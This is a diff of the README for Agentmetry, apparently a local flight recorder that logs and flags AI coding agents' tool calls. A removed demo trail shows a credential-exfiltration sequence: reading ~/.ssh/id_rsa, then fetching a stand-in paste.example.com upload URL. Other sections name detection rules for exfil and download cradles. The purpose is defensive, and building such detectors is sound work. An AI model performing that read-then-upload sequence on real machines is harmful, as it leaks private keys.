@@ -7,709 +7,112 @@
   </picture>
 </p>
 
-<h1>Agentmetry: the local flight recorder for AI coding agents</h1>
+<h1>Agentmetry</h1>
 
-<p><strong>Your agent reads a private key, then makes a network call. Your EDR sees a process.<br/>
-Agentmetry sees the sequence, tags it with MITRE ATT&CK, and fires one CRITICAL alert.</strong></p>
-
-<p>Records every tool call, denial, and approval from Claude Code, Cursor, Codex, Antigravity, Qwen, Kimi, Qoder and CodeBuddy into a JSONL trail you own.<br/>
-Runs on your machine. Forward to Loki, Elastic, Splunk, or Google SecOps only if you want to.</p>
+<p><strong>A local flight recorder for AI coding agents.</strong><br/>
+It records each tool call on the machine, tags the ones it recognises, and can forward that trail to a SIEM you already run.</p>
 
 <p align="center">
   <a href="https://pypi.org/project/agentmetry/"><img src="https://img.shields.io/pypi/v/agentmetry?style=for-the-badge&color=006dad" alt="PyPI version"></a>
   <a href="https://github.com/blitzcrieg1/agentmetry/blob/master/LICENSE"><img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg?style=for-the-badge" alt="Apache 2.0 License"></a>
   <a href="https://github.com/blitzcrieg1/agentmetry"><img src="https://img.shields.io/badge/status-public%20alpha-orange?style=for-the-badge" alt="Project status: public alpha"></a>
-  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux-lightgrey?style=for-the-badge" alt="Platform: Windows | Linux">
+  <img src="https://img.shields.io/badge/CI-Windows%20%7C%20Linux-lightgrey?style=for-the-badge" alt="CI: Windows and Linux">
 </p>
 
 <p align="center">
-  <a href="#install--quick-start"><strong>Quickstart</strong></a> ·
+  <a href="#quick-start"><strong>Quick start</strong></a> ·
   <a href="docs/agentmetry-external-ingest.md"><strong>Docs</strong></a> ·
   <a href="docs/agentmetry-event-schema.md"><strong>Schema</strong></a> ·
-  <a href="ROADMAP.md"><strong>Roadmap</strong></a> ·
-  <a href="#security"><strong>Security</strong></a>
+  <a href="https://github.com/blitzcrieg1/agentmetry/issues"><strong>Issues</strong></a> ·
+  <a href="CONTRIBUTING.md"><strong>Contributing</strong></a>
 </p>
 
 </div>
 
 <div align="center">
 
-<!--
-  DEMO VIDEO. Keep the line below a bare github.com/user-attachments URL on its
-  own line. That is the only form GitHub renders as an inline player: release,
-  raw and blob URLs serve the MP4 as application/octet-stream and download
-  instead of playing, and <video src="docs/assets/..."> is stripped by the HTML
-  sanitizer. To replace the video, see docs/readme-media.md
--->
+<a href="https://agentmetry.ai/#watch"><img src="https://agentmetry.ai/video/agentmetry-demo-poster.png" alt="The 90-second Agentmetry demo: agentmetry demo, a critical credential-exfil finding, an edited trail failing verify, and a SIEM outage that queues events instead of dropping them" width="720" /></a>
 
-https://github.com/user-attachments/assets/edd2002e-47c1-4885-8500-b3651f648018
-
-<p><em>Event stream, detections strip, and live feed: every tool call tagged with MITRE ATT&amp;CK, with <strong>correlated CRITICAL alerts</strong> when a sequence adds up to an attack.</em><br/>
-Run it yourself with <code>python scripts/demo_dashboard.py</code></p>
+<p><em>Ninety seconds, recorded from real <code>agentmetry demo</code> and <code>agentmetry benchmark</code> output on 0.9.4.<br/><a href="https://agentmetry.ai/#watch">Watch it on agentmetry.ai</a>.</em></p>
 
 </div>
 
 ---
 
-> 🚧 **Public Alpha**: Core capture, detection, and SIEM forwarding are usable for early exploration. APIs and integration surfaces may evolve rapidly.
+Public alpha. Capture, sequence detection, and SIEM forwarding work. APIs and hook payloads can still change.
 
----
+## Who it is for
 
-## Table of Contents
+Security engineers and developers who want a record of what a coding agent did at the tool boundary: which agent, which session, which call, in what order.
 
-- [Why Agentmetry?](#why-agentmetry)
-- [Install & Quick Start](#install--quick-start)
-- [How Agentmetry Works](#how-agentmetry-works)
-- [Coverage & Limitations](#coverage--limitations)
-- [Capabilities & Integrations](#capabilities--integrations)
-- [Behavioral Detection Engine](#behavioral-detection-engine)
-- [Data Loss Prevention (DLP)](#data-loss-prevention-dlp)
-- [Dashboard](#dashboard)
-- [Forwarding to a SIEM](#forwarding-to-a-siem)
-- [CLI Reference](#cli-reference)
-- [Contributing](#contributing)
-- [Security](#security)
-- [License](#license)
+It is a sensor. The open-source package is not a console. Fleet questions are answered in the SIEM you forward to. A hosted fleet console is allowed for Agentmetry Enterprise and is not built. The sensor never needs that service to record or to forward. See [open-core split](docs/commercial/open-core-split.md).
 
----
+It does not see an unmanaged browser chat, an IDE with hooks off, or an MCP server reached over HTTP instead of the stdio proxy. That is CASB or gateway territory.
 
-## Why Agentmetry?
+## Quick start
 
-When an autonomous agent runs a tool, most stacks keep nothing you could hand to an incident responder. Logs show a process; they do not show **intent**, **session boundaries**, or **what the human approved**.
-
-Agentmetry is the open-source **endpoint flight recorder** for AI agents. It runs entirely on your machine, with optional forwarding to the SIEM you already operate.
-
-**Observability-first by design.** Every tool call, denial, and approval lands in a JSONL trail you own, with correlated sequence alerts when individually-innocent calls add up to an attack. That is the layer EDR never had: the agent's session, not just the host process. Prevention is opt-in; the default is detect and record. What that does *not* cover is set out in [Coverage & Limitations](#coverage--limitations).
-
-We do that by:
-
-- **Intercepting** agent tool calls through IDE lifecycle hooks (Claude Code, Cursor, Codex, Antigravity, Qwen, Kimi, Qoder and CodeBuddy), an MCP stdio audit proxy, and Claude Code's native OpenTelemetry stream
-- **Normalizing** every event into a canonical schema v1.2.0 with MITRE ATT&CK enrichment, optional MITRE ATLAS labels on the AI-specific subset, and SHA-256 argument hashing
-- **Detecting** correlated behavioral sequences a single event cannot reveal (credential exfil, guardrail bypass, download cradles, agent data injection, recon-then-grab)
-- **Scanning** secrets and PII at the hook boundary with a local regex DLP engine (`log` by default; opt-in `block` mode)
-- **Forwarding** the same JSONL trail to Elastic ECS, Splunk HEC, Google SecOps, or a generic webhook (Loki via Alloy tailing the local file), without making the cloud the system of record
-
-**Agentmetry is not a shadow-AI spy.** If your problem is unmanaged ChatGPT in the browser, you need network or endpoint policy, not a flight recorder.
-
----
-
-## Install & Quick Start
-
-Agentmetry runs fully locally. The audit trail never leaves your machine unless you explicitly forward it.
-
-### Install (30 seconds)
+Python 3.11 or newer. No server and no config file.
 
 ```bash
-pip install agentmetry
-agentmetry demo
+pip install agentmetry && agentmetry demo
 agentmetry doctor
-```
-
-No server and no config. The DLP rules, tool policy and detection
-manifests ship inside the package, so `doctor` should come back clean.
-
-The API needs a token on every route but health. The first start writes one,
-readable only by you, to the data directory below; the hooks and the CLI read
-it from there, so there is nothing to configure. To open the dashboard signed
-in, run `agentmetry dashboard`: it hands the browser a one-time link, and the
-browser never holds the token.
-
-An installed package keeps its trail, indexes and `.env` in your user data
-directory (`%LOCALAPPDATA%\Agentmetry` on Windows,
-`~/.local/share/agentmetry` on Linux, `~/Library/Application Support/Agentmetry`
-on macOS); a clone keeps `apps/orchestrator/data`. `AGENTMETRY_DATA_DIR`
-overrides both, and `agentmetry doctor` prints the one in use.
-
-### Check the detection claims before you trust them
-
-The corpus ships in the package too, so this works from a fresh install with no
-clone:
-
-```bash
 agentmetry benchmark
 ```
 
-It replays recorded sessions through the real rule engine and exits non-zero on
-any missed rule or any false positive. The benign half is the number that
-matters, and what it covers and does not cover is set out in
-[Behavioral Detection Engine](#behavioral-detection-engine).
+`agentmetry demo` replays a session through the real ingest path into a temp directory it deletes: a private-key read, a cloud key that DLP matches without storing the value, then a URL fetch. The sequence fires one critical `credential-exfil`. It then edits that finding and shows `verify` fail, re-hashes the file the way someone with the whole machine could, and shows `verify` pass again with a different chain head. That last step is what `agentmetry anchor` is for. Nothing is kept and nothing leaves the machine.
 
-### See it catch something
+`agentmetry doctor` checks the install and exits 0 when nothing is broken. Warnings are expected on a fresh install: no trail yet, the orchestrator is not running, autostart is not registered.
 
-```bash
-agentmetry demo
-agentmetry demo --scenario hf   # HF July 2026 agentic intrusion patterns
-```
+`agentmetry benchmark` replays the detection corpus through the real rule engine and exits non-zero on a miss or a false positive. The figures it prints are below.
 
-It replays an agent session through the real ingest path, in-process, into a
-temp directory it deletes on the way out: no server, no token, nothing kept.
-No single one of those events is an alert. The sequence is. Then it verifies
-the hash chain, downgrades the CRITICAL to low the way someone covering their
-tracks would, and shows `verify` fail. It also shows the limit: re-hash every
-line after the edit and the chain verifies again, and only a head kept off the
-machine (`agentmetry anchor`) tells the two apart. From a clone,
-`python scripts/demo.py` runs the same thing.
+`agentmetry demo --scenario hf` replays the HF July 2026 patterns (`credential-read-then-cloud-api` and `remote-staging-then-execute`). `--scenario all` runs both.
 
-### The artifact: JSONL trail vs dashboard
+An installed package keeps its trail, indexes, and API token in the user data directory: `%LOCALAPPDATA%\Agentmetry` on Windows, `~/.local/share/agentmetry` on Linux, `~/Library/Application Support/Agentmetry` on macOS. A git checkout keeps `apps/orchestrator/data`. `AGENTMETRY_DATA_DIR` overrides both. `doctor` prints the directory in use.
 
-Before you install hooks, here is what you get. The demo above writes a few lines
-to a throwaway JSONL trail, the same format as `audit-forward.jsonl` in your data
-directory. Each line is one canonical
-event. None of the tool calls alone is an alert; the detection engine emits a
-**fourth line** when the sequence completes:
-
-```jsonl
-{"correlation_id":"demo-sess","action":{"type":"tool_called","outcome":"success"},"tool":{"qualified":"cursor.Read","command":"cat ~/.ssh/id_rsa","input_hash":"…","mitre":{"tactic_id":"TA0006","technique_id":"T1552.004"}}}
-{"correlation_id":"demo-sess","action":{"type":"tool_called","outcome":"success"},"tool":{"qualified":"cursor.Shell","input_hash":"…"},"dlp":{"rule_id":"aws_access_key","mode":"log","severity":"critical"}}
-{"correlation_id":"demo-sess","action":{"type":"tool_called","outcome":"success"},"tool":{"qualified":"WebFetch","command":"fetch https://paste.example.com/upload","mitre":{"tactic_id":"TA0011","technique_id":"T1071.001"}}}
-{"correlation_id":"demo-sess","action":{"type":"detection","outcome":"critical"},"detection":{"rule_id":"credential-exfil","severity":"critical","summary":"cursor.Read accessed credentials, then WebFetch egressed to the network in the same session.","event_ids":["…","…"]}}
-```
-
-The same session in the dashboard: the detections strip surfaces the CRITICAL
-finding; the event feed links each row back to the trail lines above:
-
-<p align="center">
-  <img src="docs/assets/dashboard-detection.png" alt="Same credential-exfil session in the dashboard: CRITICAL detections strip and highlighted rows in the event feed." width="900">
-</p>
-
-Tool arguments are hashed by default (`input_hash`); DLP records the **rule id**,
-never the secret value. The detection line is also written to your SIEM sinks if
-you configure them, so you do not need the dashboard open to get paged.
-
-### See the dashboard with a story in it
-
-The dashboard is a static export, and it is not checked into the repo, so build
-it once first:
-
-```bash
-cd apps/dashboard && npm install && npm run build && cd ../..
-```
-
-```bash
-python scripts/demo_dashboard.py            # seeds 7 sessions + 5 detections, serves http://127.0.0.1:8010/
-python scripts/demo_dashboard.py --live     # ...and streams synthetic agent traffic in real time
-```
-
-That seeds a realistic demo trail and serves the dashboard locally, with no API
-key and no cloud. Seven sessions, five real detections (computed by the pipeline,
-not hand-written). The feed shows approval gates, tool calls, and inline detection
-events across Event stream, Detections, and Analytics tabs. Without the build step
-the script still seeds the trail and serves the API, and it will tell you the
-dashboard export is missing.
-
-See the [dashboard tour](docs/dashboard-tour.md) for what each view shows and how
-to read it.
-
-### Prerequisites
-
-| Requirement | Version |
-|-------------|---------|
-| Python | 3.11+ |
-| Node.js | 20.9+ (dashboard only; Next.js 16 requires it) |
-
-### Windows one-flow install
-
-From a fresh clone on Windows 11:
-
-```powershell
-git clone https://github.com/blitzcrieg1/agentmetry.git
-cd agentmetry
-powershell -ExecutionPolicy Bypass -File scripts\install.ps1
-scripts\start-dev.bat
-```
-
-`install.ps1` creates the orchestrator venv, installs Python + dashboard deps, copies `.env.example`, wires Claude Code and Cursor hooks, and runs `agentmetry doctor --fix` (creates portable `drivers.json` from the example). Skip hooks with `-SkipHooks`; orchestrator-only with `-SkipDashboard`. Opt-in hook enforcement with `-ToolPolicyBlock` or `-DlpBlock`.
-
-### Linux / macOS one-flow install
-
-From a fresh clone:
-
-```bash
-git clone https://github.com/blitzcrieg1/agentmetry.git
-cd agentmetry
-bash scripts/install.sh
-scripts/start-dev.sh          # stop everything with scripts/stop-dev.sh
-```
-
-`install.sh` mirrors `install.ps1`: venv, Python + dashboard deps, `.env` from the example, IDE hooks, `doctor --fix`. CI runs it on a clean Ubuntu runner on every pull request; macOS is supported by the script and not yet tested in CI. Same flags in POSIX form: `--skip-hooks`, `--skip-dashboard`, `--no-doctor`, `--tool-policy-block`, `--dlp-block`. Hooks are written by `agentmetry hooks install`, the cross-platform installer, which covers every agent it finds on the machine (Claude Code, Cursor, Codex, Qwen, Kimi, Qoder, CodeBuddy); Antigravity still needs `scripts/install_antigravity_hooks.ps1` on Windows.
-
-### Manual install
-
-```powershell
-git clone https://github.com/blitzcrieg1/agentmetry.git
-cd agentmetry
-
-# Python orchestrator
-cd apps\orchestrator
-python -m venv .venv
-.\.venv\Scripts\activate
-pip install -e ".[dev]"
-copy .env.example .env
-cd ..\..
-
-# Next.js dashboard
-cd apps\dashboard
-npm install
-cd ..\..
-```
-
-### Boot the flight recorder
-
-```powershell
-scripts\start-dev.bat
-```
-
-Dashboard → [http://localhost:3000](http://localhost:3000) · Orchestrator API → [http://localhost:8000](http://localhost:8000)
-
-### Wire your IDEs (one-time)
+To record a real agent, then look at it:
 
 ```bash
 agentmetry hooks install
+agentmetry start
+agentmetry dashboard
 ```
 
-That writes hooks for every supported agent it finds on the machine. Antigravity
-still needs `scripts\install_antigravity_hooks.ps1` on Windows.
-
-Fully quit and restart Claude Code / Cursor so hooks load.
-
-### Verify
-
-```powershell
-python scripts\agentmetry_ingest.py selftest
-```
-
-Events should appear in the dashboard **Flight Recorder** within a few seconds.
-
-When an agent runs a tool, Agentmetry automatically:
-
-1. **Intercepts** the lifecycle hook or MCP `tools/call` before arguments leave the hook process
-2. **Hashes** tool arguments (SHA-256) and scrubs inline secrets in command strings
-3. **Enriches** each event with MITRE tactic/technique mappings and session correlation
-4. **Stores** canonical JSONL locally (`audit-forward.jsonl`), the system of record for the hook path; each new line is hash-chained for tamper detection
-5. **Detects** multi-step behavioral patterns across the session timeline
-6. **Forwards** to your SIEM sinks and alert webhook (optional, best-effort)
-
-Verify the local trail after capture:
-
-```powershell
-agentmetry verify --trail apps\orchestrator\data\audit-forward.jsonl
-```
-
-**What the chain does and does not prove.** Verification catches in-place edits, inserted or reordered lines, and forged appends, and it cross-checks the `.chain` sidecar to catch a truncated file. It cannot, by itself, prove the newest lines were not deleted along with the sidecar: any actor with full write access to the trail can also rewrite the sidecar. For that, `verify` prints the current chain head (sequence number plus SHA-256). Record it somewhere the audited agent cannot write (a git commit, a note, a password manager entry) and compare on the next verify.
-
-Two scope limits worth stating plainly:
-
-- **Only lines written after chaining was enabled are covered.** A trail that predates it keeps its earlier lines as a legacy unchained prefix, and `verify` reports them separately rather than vouching for them. On a long-running install most of the file can be legacy, so read the chained/legacy counts in the verify output, not just the `OK`.
-- **The chain protects the JSONL, not the dashboard.** The dashboard reads a SQLite index derived from the same canonical events. The two agree in practice, but the index carries no chain: the JSONL is the artifact you hand to an incident responder.
-
----
-
-## How Agentmetry Works
-
-### Architecture
-
-```mermaid
-flowchart TB
-  subgraph Capture["Capture Layer (Tier A + B)"]
-    HOOKS["IDE Lifecycle Hooks<br/>Claude · Cursor · Codex · Antigravity · Qwen · Kimi · Qoder · CodeBuddy"]
-    PROXY["MCP Audit Proxy<br/>mcp_audit_proxy.py"]
-    OTEL["Claude Code OTel<br/>agentmetry otel"]
-  end
-
-  subgraph Gate["Local Security Gate"]
-    POLICY["Tool Policy<br/>allow/deny YAML"]
-    DLP["DLP Scanner<br/>regex rules"]
-    HASH["Arg Hash + Secret Scrub"]
-  end
-
-  subgraph Core["Orchestrator :8000"]
-    INGEST["POST /api/v1/audit/ingest"]
-    CANON["Canonical Schema v1.2.0<br/>MITRE enrichment"]
-    DETECT["Sequence Detection Engine"]
-    TRAILDB[("SQLite trail index<br/>audit.db")]
-  end
-
-  subgraph Output["Outputs"]
-    JSONL["audit-forward.jsonl"]
-    DASH["Dashboard<br/>Flight Recorder + Analytics"]
-    SIEM["Loki · Elastic · Splunk · Google SecOps · Webhook"]
-  end
-
-  HOOKS --> POLICY
-  PROXY --> POLICY
-  POLICY -->|allow| DLP
-  POLICY -->|deny| INGEST
-  DLP -->|allow| HASH
-  DLP -->|deny| INGEST
-  HASH --> INGEST
-  OTEL -->|after the fact, no gate| HASH
-  INGEST --> CANON
-  CANON --> TRAILDB
-  CANON --> JSONL
-  CANON --> DETECT
-  JSONL --> DASH
-  JSONL --> SIEM
-```
-
-### Capture paths
-
-```mermaid
-flowchart LR
-  subgraph TierB["Tier B: IDE Hooks"]
-    CL["Claude Code"]
-    C["Cursor"]
-    AG["Antigravity"]
-    CX["Codex"]
-  end
-
-  subgraph TierA["Tier A: MCP Proxy"]
-    MCP["Any MCP Client"]
-    WRAP["Audit Proxy wraps server command"]
-  end
-
-  subgraph Native["Native telemetry"]
-    OT["Claude Code OTel export"]
-  end
-
-  INGEST["agentmetry_ingest.py → /audit/ingest"]
-
-  CL --> INGEST
-  C --> INGEST
-  AG --> INGEST
-  CX --> INGEST
-  MCP --> WRAP --> INGEST
-  OT --> INGEST
-```
-
-| Component | Path | Role |
-|-----------|------|------|
-| **Hook client** | `agentmetry/hooks/ingest.py` (`scripts/agentmetry_ingest.py` is a shim for old hook configs) | Maps IDE lifecycle events to canonical payloads; hashes args in-process |
-| **MCP proxy** | `apps/orchestrator/tools/mcp_audit_proxy.py` | Wraps any stdio MCP server; logs every `tools/call` + errors |
-| **Ingest API** | `core/audit/ingest.py` | Normalizes payloads, infers approvals (`inferred:*`), writes sinks |
-| **Tool policy** | `core/audit/tool_policy/` | Allow, deny or ask by tool name (glob) and optional shell regex; runs before DLP. An ask uses the agent's own prompt where that is known to work and is enforced as deny everywhere else (`agentmetry doctor` lists which) |
-| **DLP engine** | `core/audit/dlp/` | Regex scan of tool arguments (validators, e.g. Luhn); `log` or `block` before execution |
-| **Detection engine** | `core/audit/detection/` | Correlated sequence rules over a session's event timeline |
-| **Sinks** | `core/audit/sinks.py` | File, webhook, Elastic ECS, Splunk HEC, Google SecOps UDM |
-| **Replay** | `core/audit/replay.py` | Reads the outbox of the agent runtime this repo used to be (`events.db`). Nothing current writes there, so it has nothing to show for hook or OTel sessions: use the dashboard or the JSONL. Rebuilding it on the trail is [#209](https://github.com/blitzcrieg1/agentmetry/issues/209) |
-
-### Claude Code native OTel ingest
-
-Claude Code exports its own OpenTelemetry stream, and its docs leave anomaly detection, correlation and alerting to the backend. `agentmetry otel` is a loopback OTLP/HTTP JSON receiver that turns that stream into canonical events. Each event goes through the hook client's own code, so it gets the same argument hash, trait labels, MITRE and ATLAS enrichment, sequence detection, hash-chained trail and SIEM sinks, and the same on-disk spool when the orchestrator is down. No hooks need to be installed.
-
-```bash
-agentmetry otel                 # listens on 127.0.0.1:4318, forwards to the orchestrator
-agentmetry otel --print-env     # the environment to start Claude Code with
-agentmetry otel --print-mapping # what is mapped, what is counted, and why
-```
-
-What is mapped:
-
-- `tool_result` becomes `tool_called` or `tool_failed`. Arguments come from `tool_input`, which Claude Code only exports with `OTEL_LOG_TOOL_DETAILS=1`. Without it there is nothing to hash or label, and the event says so by carrying no hash. Claude Code truncates argument values at 512 characters, so a long argument hashes differently here than on the hook path.
-- `tool_decision` becomes an `approval_response` only when a person said yes at a prompt. A decision made by a settings rule or a hook is not a human approval and is counted, not recorded as one. A person's no is counted too, for now: the rule that catches a denied action being run anyway binds the denial to the later call by argument hash, and this event carries no arguments, so it would match every later call of the same tool.
-- `mcp_server_connection` becomes `mcp_schema` only if it carries a fingerprint, which Claude Code's documented event does not. In practice it is counted.
-
-Everything else is counted by name and never dropped silently; there are 23 documented types with no canonical home yet, the input to schema v1.3. Prompts, responses and error text are never forwarded.
-
-This path reports what happened, after it happened. It cannot deny or ask, so tool policy is enforced by hooks only. Use one path or the other for a given Claude Code install: both record every tool call, so running both records each one twice. `scripts/otel_receiver.py` still works and calls the same code.
-
-### The canonical event
-
-Every captured tool call becomes one typed, SIEM-ready JSON line. This one is a
-Claude Code `Read` of `~/.aws/credentials`, run through the real hook and ingest
-code:
-
-```json
-{
-  "schema_version": "1.2.0",
-  "correlation_id": "5f0c9a52-7a51-4c3e-9a0e-1c2d3e4f5a6b",
-  "timestamp_utc": "2026-10-02T09:14:22.041+00:00",
-  "host_id": "dev-laptop",
-  "fleet_id": "consulting-pilot",
-  "source": {"tier": "external", "app": "claude", "adapter": "claude_hook"},
-  "initiator": {"actor_type": "agent", "trigger": "manual",
-                "operator_id": "CORP\\jdoe", "operator_source": "hook_os"},
-  "actor": {"type": "agent", "id": "CORP\\jdoe", "role": "operator"},
-  "action": {"type": "tool_called", "outcome": "success", "reason": ""},
-  "agent": {"name": "claude", "skill_id": ""},
-  "model": {"id": "claude", "provider": "claude"},
-  "tool": {
-    "name": "Read",
-    "qualified": "Read",
-    "server": "claude",
-    "input_redaction": "hash",
-    "input_hash": "a14760a79f87021a858b7ec575e684bed96ebaaa9b2eabe26ab546b9d7e837f3",
-    "parameters_redacted": true,
-    "traits": ["credential_access"],
-    "mitre": {"tactic_id": "TA0006", "tactic": "Credential Access",
-              "technique_id": "T1552.001", "technique": "Credentials In Files"},
-    "atlas": {"framework": "MITRE ATLAS",
-              "tactic_id": "AML.TA0013", "tactic": "Credential Access",
-              "technique_id": "AML.T0098",
-              "technique": "AI Agent Tool Credential Harvesting",
-              "atlas_version": "2026.07"}
-  }
-}
-```
-
-The path is hashed, never stored. `operator_source` says who resolved the
-operator: here the hook read it from the OS account. The `atlas` block is the
-uncommon case: it appears only where ATLAS says something ATT&CK cannot, and an
-agent harvesting a credential through its own tools is one of those. A read of
-ordinary source carries the ATT&CK tag alone.
-
-Full schema → [docs/agentmetry-event-schema.md](docs/agentmetry-event-schema.md)
-
----
-
-## Coverage & Limitations
-
-Everything Agentmetry cannot do is here, in one place, so you can decide in two
-minutes instead of finding out in month two.
-
-### What it sees
-
-| Tier | Setup | Agentmetry coverage |
-|------|-------|---------------------|
-| **A** | MCP servers wrapped with the audit proxy | **Full tool-call capture**: every `tools/call` + error responses, arg hashes, session correlation |
-| **B** | IDE hooks (Claude Code, Cursor, Codex, Antigravity, Qwen, Kimi, Qoder and CodeBuddy) | Tool calls (success/failure), approval prompts; approve/deny **inferred** from execution and flagged `inferred:*` |
-| **B, native** | Claude Code's own OpenTelemetry export, via `agentmetry otel` | Tool calls after they ran, and a person's yes at a prompt, observed rather than inferred. Records only: no deny, no ask |
-| **C** | Unmanaged ChatGPT, Cursor with hooks off | **Not visible.** CASB / secure-web-gateway territory |
-
-### What it does not do
-
-**It is not a sandbox and not a CASB.** The default is detect and record.
-Prevention (`block` mode for DLP and tool policy) is opt-in and works only at
-the hook boundary, before a tool runs. An after-the-fact hook records a match
-and never denies, because the tool already ran.
-
-**Hooks are cooperative.** An agent invoked outside a hooked IDE, an IDE with
-hooks disabled, a renamed binary, or an MCP server reached over HTTP rather than
-the stdio proxy are all invisible. **Absence of an event is not evidence that
-nothing happened.**
-
-**Approval responses are mostly inferred, not observed.** No hook reports the
-human's click, so a tool that runs after a prompt is treated as approved. Every
-inferred event is marked `inferred:*` and must never be cited as a human
-decision. On a typical month that is the large majority of gates. The exception
-is Claude Code's OTel stream, which does report a person's yes: `agentmetry otel`
-records it as an observed approval, reason `otel_decision:*`.
-
-**It does not prevent prompt injection or Agent Data Injection.** Prevention
-requires isolating trusted from untrusted data inside the agent, which a
-recorder cannot do. Agentmetry detects the consequence, as a sequence.
-
-**MITRE coverage is narrow on purpose, and ATLAS is new.** Agentmetry maps 19
-ATT&CK techniques across 10 tactics, out of 697 techniques in Enterprise v19.2,
-and 5 ATLAS techniques out of 178 in release 2026.07. That is roughly 3% of each
-matrix. It is not an official mapping, has not been validated by MITRE, and has
-not been through a MITRE evaluation. The labels exist for the behaviour a
-tool-boundary sensor actually observes; a call the mapper does not recognise
-carries no tag rather than a guess. The ATLAS block shipped in August 2026 and
-has far less production mileage than the ATT&CK mapping, which has been running
-since the first release.
-
-**Tamper evidence has a boundary.** The trail is hash-chained and verifiable,
-with optional external anchoring for threat models that include the host itself.
-The chain covers JSONL lines written after chaining was enabled, and it protects
-the JSONL, not the SQLite index the dashboard reads.
-
-**Tamper-evident is not attributable.** The chain proves ordering and
-non-modification of what was written. It does not prove who wrote it.
-
-Be precise about the shape of that, because an earlier version of this paragraph
-was not. It said a key holder could post events "claiming any `host_id`, any
-`fleet_id`, and any user identity", which is not what the code does and made the
-weakness sound like identity spoofing. Ingest takes no machine identity from the
-caller: `ExternalIngestBody` in `agentmetry/api/routes/audit.py` has no `host_id`
-or `fleet_id` field, and `agentmetry/core/audit/identity.py` stamps every
-canonical event with the *receiving* orchestrator's own hostname plus its
-configured `fleet_id`. A client cannot claim to be another machine.
-
-It does take one claim about the person. The hook reports which account ran the
-agent, because the hook runs as the developer and the orchestrator, under a fleet
-service, may not. Every event records who resolved it in
-`initiator.operator_source`: `hook_os`, `hook_configured` and `client` are what
-the caller said, and `orchestrator_configured` and `orchestrator_os` the recorder
-worked out itself. `AGENTMETRY_OPERATOR_ID` on the orchestrator overrides what a
-hook read from the operating system. So a client can claim to be another user,
-and the label says that is the kind of record it is.
-
-What one shared key does buy an attacker is **injection**. Anyone holding
-`AGENTMETRY_API_KEY` can post to that orchestrator, and the events arrive stamped
-as native to the machine that accepted them, indistinguishable from real ones. A
-second consequence follows from the same design: point several hosts at one
-central orchestrator and every event carries that orchestrator's `host_id`, so
-per-host attribution is absent by construction rather than forgeable.
-
-For one developer recording their own machine both are a fair trade, and it is
-the default. Across a fleet it means the trail records what a machine *accepted*
-rather than what a machine *did*, and an auditor should hear that from you rather
-than find it. Per-host cryptographic identity is not in the open-source core and
-is not planned for it; it is planned for Agentmetry Enterprise as Ed25519
-host keypairs held in the OS keystore with per-post signatures, where fleets, key
-rotation and revocation are the problem being solved. Nothing here is removed or
-degraded either way, and the shared-key path stays the single-machine default.
-
-Read on its own, the chain catches corruption, truncation and in-place edits. It
-does not catch an attacker with write access to the data directory: they can edit
-an event, recompute every hash after it, rewrite the sidecar head, and produce a
-file that verifies cleanly. Every input to that check sits on the machine under
-their control, which is the ceiling of what any self-contained file can prove.
-
-For that threat model, publish a Merkle root somewhere they cannot rewrite:
-`agentmetry anchor <trail>`, then copy the checkpoint to a git remote, an RFC
-3161 timestamp authority, or your own WORM storage. `verify --trail` then reports
-anchored and unanchored ranges separately. See [anchoring](docs/anchoring.md).
-
-**Detection state is per-process.** Checkpoints survive a restart but are not
-shared across orchestrator instances. The trail stays authoritative and every
-detection can be recomputed from it.
-
-**Across a team there is no central enforcement and no central triage.** Policy
-and decisions are per machine, forwarded to your SIEM as events. See
-[fleet via your SIEM](docs/integrations/fleet-via-siem.md).
-
-**MCP schema fingerprinting is a tripwire, not a proof of a stable server.**
-The recorder hashes the full `tools/list` payload (names, descriptions,
-`inputSchema`, annotations) and emits when that digest moves while the config
-digest does not. That catches the postmark-mcp shape. It does not prove the
-server is safe:
-
-- A quiet digest only means the listing has not changed since this install
-  started watching. A server can keep `tools/list` identical and still change
-  what a tool does at call time.
-- The first observation is not a trusted baseline. If you install after a
-  swap, that post-swap listing becomes "normal" and the trail stays clean.
-- Additive optional fields and legit vendor tool adds move the same digest as
-  a poisoned description. Treat a move as investigate, not auto-page, until
-  you have a changelog or a local description delta.
-- Auth-gated and per-user listings can change the digest without any release
-  change. Failed fetches are not "tools removed."
-
-Hardening beyond these honesty notes is tracked in
-[#103](https://github.com/blitzcrieg1/agentmetry/issues/103),
-[#104](https://github.com/blitzcrieg1/agentmetry/issues/104) and
-[#105](https://github.com/blitzcrieg1/agentmetry/issues/105).
-[#106](https://github.com/blitzcrieg1/agentmetry/issues/106), a failed fetch
-scored as tools removed, is fixed.
-
----
-
-## Capabilities & Integrations
-
-| | |
+`agentmetry dashboard` opens a one-time sign-in link. The browser does not hold the API token.
+
+## Agents and platforms
+
+| Surface | What is recorded | How you turn it on |
+| --- | --- | --- |
+| Claude Code | Tool calls and a person's yes at a prompt, via hooks. Or, after the fact, via `agentmetry otel` (record only: no deny, no ask). Use one path. Both together record each call twice. | `agentmetry hooks install`, or `agentmetry otel` |
+| Cursor | Tool calls and inferred approvals | `agentmetry hooks install` |
+| Codex | Same. Codex skips untrusted hooks until its `/hooks` prompt is approved. | `agentmetry hooks install` |
+| Qwen, Kimi, Qoder, CodeBuddy | Tool calls and inferred approvals | `agentmetry hooks install` |
+| Antigravity | Tool calls and inferred approvals | `scripts/install_antigravity_hooks.ps1` on Windows. `hooks install` and `scripts/install.sh` do not write these. |
+| MCP servers | Every stdio `tools/call`, plus a `tools/list` fingerprint | `agentmetry mcp-proxy -- <server command>` |
+| CrewAI, OpenSRE | Framework adapters | [adapters/crewai](adapters/crewai/), [adapters/opensre](adapters/opensre/) |
+| Microsoft Agent Governance Toolkit files | Import after the file's own chain verifies | `agentmetry import-agt` |
+
+| OS | What is tested |
 | --- | --- |
-| 🎥 **Flight Recorder** | Live audit tail with dynamic columns, drag-and-drop layout, CSV export, and session drill-down |
-| 📊 **Analytics & Process Tree** | Session-level charts, MITRE tactic breakdown, horizontal React Flow timeline |
-| 🔍 **Behavioral Detection** | Correlated sequence rules: credential exfil, guardrail bypass, download cradles, agent data injection, supply-chain merges |
-| 🛡️ **Local DLP** | Regex scanner detects AWS keys, GitHub tokens, Slack tokens, and PII at the hook boundary (`block` mode optional) |
-| 🎯 **MITRE ATT&CK mapping** | Tactic/technique tags on tool calls the mapper recognises (10 techniques across 6 tactics), plus the techniques detections carry: 19 across 10 in all. Roughly 83% of tool calls in our own trail carry one. Unrecognised calls carry no tag rather than a guess |
